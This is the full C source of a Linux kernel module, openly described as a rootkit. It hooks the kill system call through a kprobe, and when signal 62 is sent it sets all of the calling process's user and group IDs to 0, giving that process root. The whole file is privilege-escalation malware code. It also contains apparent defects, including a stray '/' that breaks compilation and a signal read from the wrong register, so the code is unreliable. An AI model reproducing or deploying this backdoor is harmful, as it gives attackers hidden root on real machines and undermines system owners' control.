#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/cred.h>
#include <linux/kprobes.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Nathan, FL");
MODULE_DESCRIPTION("Hook kill syscall to give root privileges using Kprobes");
MODULE_VERSION("0.01");

static struct kprobe kp;
void set_root(void);

static int handler_pre(struct kprobe *p, struct pt_regs *regs)
{
    int sig = regs->si; /
    printk(KERN_INFO "rootkit: Received signal %d\n", sig); 

    if (sig == 62) {
        printk(KERN_INFO "rootkit: Granting root privileges...\n");
        set_root();
        regs->si = 0; 
        return 0;      
    }

    return 1; 
}


void set_root(void)
{
    struct cred *root;
    root = prepare_creds();
    if (root == NULL)
        return;

    root->uid.val = root->gid.val = 0;
    root->euid.val = root->egid.val = 0;
    root->suid.val = root->sgid.val = 0;
    root->fsuid.val = root->fsgid.val = 0;

    commit_creds(root);
}

static int __init rootkit_init(void)
{
    int ret;
    kp.symbol_name = "__x64_sys_kill"; 
    kp.pre_handler = handler_pre;

    ret = register_kprobe(&kp);
    if (ret < 0) {
        printk(KERN_ERR "rootkit: Failed to register kprobe, returned %d\n", ret);
        return ret;
    }

    printk(KERN_INFO "rootkit: Kprobe registered at %s\n", kp.symbol_name);
    return 0;
}

static void __exit rootkit_exit(void)
{
    unregister_kprobe(&kp);
    printk(KERN_INFO "rootkit: Kprobe unregistered\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);